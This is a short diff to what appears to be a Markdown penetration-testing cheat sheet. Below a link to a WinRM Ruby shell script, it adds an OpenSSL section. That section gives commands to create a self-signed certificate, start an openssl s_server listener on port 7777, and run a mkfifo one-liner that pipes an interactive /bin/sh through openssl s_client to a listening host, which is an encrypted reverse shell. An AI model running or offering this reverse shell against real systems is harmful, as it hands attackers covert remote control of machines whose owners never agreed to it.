@@ -22,3 +22,17 @@
 ### WinRM ruby shell
 
 `https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb`
+
+### OpenSSL
+
+  #### Generate keys and certs
+  
+  `openssl req -x509 -newkey rsa:4096 -keyout key.key -out cert.crt -days 365 -nodes`
+  
+  #### Start OpenSSL server listener
+  
+  `openssl s_server -quiet -key key.key -cert cert.crt -port 7777`
+  
+  #### Make reverse connection 
+  
+  `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:7777 > /tmp/s; rm /tmp/s`
